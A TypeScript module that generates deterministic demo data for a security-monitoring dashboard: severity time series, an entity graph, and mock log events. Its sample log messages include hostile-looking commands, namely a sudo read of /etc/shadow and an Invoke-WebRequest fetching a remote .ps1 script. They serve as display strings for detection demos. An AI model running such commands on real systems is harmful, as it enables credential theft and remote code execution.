/**
 * Deterministic demo data generators — seeded pseudo-random so every call
 * with the same seed produces identical output.
 *
 * All functions are pure with no I/O or DOM dependencies.
 */

import type { GraphEntity, GraphRelation } from "@/viz/entityGraphAdapter";

// --------------------------------------------------------------------------
// Tiny seeded PRNG (Mulberry32)
// --------------------------------------------------------------------------
function mulberry32(seed: number) {
  let s = seed;
  return function rand(): number {
    s |= 0;
    s = (s + 0x6d2b79f5) | 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 0x100000000;
  };
}

// --------------------------------------------------------------------------
// Series samples (for uPlot / SeverityStack / MiniVolume)
// --------------------------------------------------------------------------

export interface SeriesSample {
  /** Unix timestamp in seconds */
  timestamp: number;
  info: number;
  warn: number;
  crit: number;
}

interface SeriesOptions {
  count?: number;
  seed?: number;
  startTime?: number;
  stepSeconds?: number;
}

/**
 * Generate `count` deterministic time-series samples.
 * Default: 900 samples (15 min @ 1 s), starting from now minus 15 min.
 *
 * Ported from the StackChart / MiniVolume generators in dashboard.jsx.
 */
export function generateSeriesSamples(opts: SeriesOptions = {}): SeriesSample[] {
  const count = opts.count ?? 900;
  const step = opts.stepSeconds ?? 1;
  const now = Math.floor(Date.now() / 1000);
  const t0 = opts.startTime ?? now - count * step;
  const rand = mulberry32(opts.seed ?? 12345);

  return Array.from({ length: count }, (_, i) => {
    const t = i / count;
    const info = Math.max(0, 60 + 28 * Math.sin(t * 6.2) + 14 * Math.sin(t * 13.1 + 1) + (rand() - 0.5) * 8);
    const warn = Math.max(0, 12 + 8 * Math.sin(t * 8.4 + 0.4) + (i > Math.floor(count * 0.6) && i < Math.floor(count * 0.8) ? 16 : 0) + rand() * 3);
    const crit = Math.max(0, (i > Math.floor(count * 0.65) && i < Math.floor(count * 0.75) ? 8 + (i - Math.floor(count * 0.65)) * 0.15 : 0) + (i > Math.floor(count * 0.82) ? 3 : 0) + rand() * 1);
    return {
      timestamp: t0 + i * step,
      info: Math.round(info * 10) / 10,
      warn: Math.round(warn * 10) / 10,
      crit: Math.round(crit * 10) / 10,
    };
  });
}

// --------------------------------------------------------------------------
// Graph data (for EntityGraphCanvas)
// --------------------------------------------------------------------------

export interface DemoGraphData {
  nodes: GraphEntity[];
  edges: GraphRelation[];
}

interface GraphOptions {
  seed?: number;
  nodeCount?: number;
}

const ENTITY_TYPES = ["user", "host", "ip", "service", "process"] as const;
const ENTITY_NAMES = [
  "root@10.0.1.42", "svc-deploy", "web-04", "win-jumphost", "admin@aws",
  "203.0.113.41", "jenkins-agent-7", "postgres", "db-01", "db-02",
  "web-05", "svc-api", "cron", "nginx", "edge-gw-1",
];
const RELATION_TYPES = [
  "authenticated_from", "logged_into", "has_ip", "accessed", "resolved_to", "spawned_by",
] as const;

/**
 * Generate a deterministic graph with interconnected entities.
 * All edge endpoints reference existing node UUIDs.
 *
 * Ported from GraphCanvas in dashboard.jsx with a seeded PRNG.
 */
export function generateGraphData(opts: GraphOptions = {}): DemoGraphData {
  const rand = mulberry32(opts.seed ?? 99999);
  const nodeCount = opts.nodeCount ?? 13;

  const nodes: GraphEntity[] = Array.from({ length: nodeCount }, (_, i) => {
    const nameIdx = i % ENTITY_NAMES.length;
    const typeIdx = i % ENTITY_TYPES.length;
    const risk = Math.round(rand() * 100) / 100;
    return {
      entity_uuid: `demo-uuid-${i.toString().padStart(3, "0")}`,
      entity_type: ENTITY_TYPES[typeIdx],
      entity_value: `${ENTITY_NAMES[nameIdx]}${i >= ENTITY_NAMES.length ? `-${i}` : ""}`,
      risk_score: risk,
      event_count: Math.floor(rand() * 5000),
      alert_count: Math.floor(rand() * 5),
    };
  });

  // Generate edges ensuring source !== target and valid UUIDs
  const edgeCount = Math.max(nodeCount - 1, Math.floor(nodeCount * 1.5));
  const seen = new Set<string>();
  const edges: GraphRelation[] = [];

  // Ensure connectivity: chain of nodeCount-1 edges
  for (let i = 1; i < nodeCount; i++) {
    const srcIdx = Math.floor(rand() * i);
    const key = `${srcIdx}_${i}`;
    if (!seen.has(key)) {
      seen.add(key);
      edges.push({
        source_uuid: nodes[srcIdx].entity_uuid,
        target_uuid: nodes[i].entity_uuid,
        relation_type: RELATION_TYPES[Math.floor(rand() * RELATION_TYPES.length)],
        severity: Math.round(rand() * 100) / 100,
      });
    }
  }

  // Add extra edges up to edgeCount
  let attempts = 0;
  while (edges.length < edgeCount && attempts < edgeCount * 10) {
    attempts++;
    const si = Math.floor(rand() * nodeCount);
    const ti = Math.floor(rand() * nodeCount);
    if (si === ti) continue;
    const key = `${si}_${ti}`;
    if (seen.has(key)) continue;
    seen.add(key);
    edges.push({
      source_uuid: nodes[si].entity_uuid,
      target_uuid: nodes[ti].entity_uuid,
      relation_type: RELATION_TYPES[Math.floor(rand() * RELATION_TYPES.length)],
      severity: Math.round(rand() * 100) / 100,
    });
  }

  return { nodes, edges };
}

// --------------------------------------------------------------------------
// Event batch (for EventStream / MiniVolume demo)
// --------------------------------------------------------------------------

export interface DemoEvent {
  timestamp: string;
  level: "INFO" | "WARN" | "CRIT";
  source: string;
  host: string;
  logger: string;
  message: string;
  tag?: string;
}

interface EventOptions {
  count?: number;
  seed?: number;
}

const SOURCES = ["syslog", "otlp", "auditd", "win", "netflow"];
const HOSTS = ["web-04", "svc-api", "db-01", "win-jumphost", "edge-gw-1", "svc-payments"];
const LOGGERS = ["sshd", "sudo", "pam_unix", "http", "kafka", "sf-sigma", "sf-anomaly"];
const MESSAGES = [
  "Accepted publickey for root from 10.0.1.42 port 50122 ssh2",
  "GET /api/v1/users 200 12ms ip=203.0.113.10",
  "Failed password for root from 10.0.1.42 port 50118 ssh2",
  "POST /api/v1/login 401 8ms",
  "session opened for postgres uid=121",
  "kill_chain · 4 tactics on root@10.0.1.42 in 12m  score=0.94",
  "root : TTY=pts/2 ; PWD=/tmp ; COMMAND=/bin/cat /etc/shadow",
  "shadow_file_access [T1003.008]  entity=root@10.0.1.42",
  "sync.completed cluster=prod apps=12",
  "consumer.poll lag=12 partition=4",
  "suspicious_powershell_download  score=0.81",
  "uncommon process tree  score=0.83  rank #7 today",
  "10.0.1.42:50122 → 10.0.4.91:22  tcp  bytes=842",
  "Invoke-WebRequest -Uri http://203.0.113.41/u.ps1",
  "ssh_brute_force [T1110.001]  entity=root@10.0.1.42",
  "kerberoast_attempt detected  score=0.91",
  "consumer.commit offset=18411 partition=4",
  "(root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)",
];
const TAGS = [undefined, undefined, undefined, "sigma: ssh_brute_force", "kill_chain", "anomaly", "sigma: shadow_file_access"];
const LEVELS: DemoEvent["level"][] = ["INFO", "INFO", "INFO", "WARN", "WARN", "CRIT"];

/**
 * Generate `count` deterministic mock events.
 * Default: 18 events (one screen-height of the event stream).
 */
export function generateEventBatch(opts: EventOptions = {}): DemoEvent[] {
  const count = opts.count ?? 18;
  const rand = mulberry32(opts.seed ?? 77777);
  const nowMs = Date.now();

  return Array.from({ length: count }, (_, i) => {
    const ms = nowMs - i * 30;
    const d = new Date(ms);
    const ts = `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}.${String(d.getMilliseconds()).padStart(3, "0")}`;
    return {
      timestamp: ts,
      level: LEVELS[Math.floor(rand() * LEVELS.length)],
      source: SOURCES[Math.floor(rand() * SOURCES.length)],
      host: HOSTS[Math.floor(rand() * HOSTS.length)],
      logger: LOGGERS[Math.floor(rand() * LOGGERS.length)],
      message: MESSAGES[Math.floor(rand() * MESSAGES.length)],
      tag: TAGS[Math.floor(rand() * TAGS.length)],
    };
  });
}
